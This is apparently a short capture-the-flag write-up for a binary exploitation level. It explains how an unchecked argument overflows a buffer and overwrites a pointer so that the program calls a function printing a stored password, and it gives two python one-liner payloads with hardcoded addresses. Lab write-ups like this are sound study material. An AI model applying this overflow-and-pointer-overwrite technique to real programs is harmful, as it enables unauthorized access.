Exploit: User input from program arguments is not protected. We are allowed to overflow a buffer and modify a value that is supposed to be the address of an other buffer. This way we can change this address to our function `m` that prints out the global variable `c` which contains the password.

```
first_arg = python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]'
second_arg = python -c 'print "\x08\x04\x84\xf4"[::-1]'
```
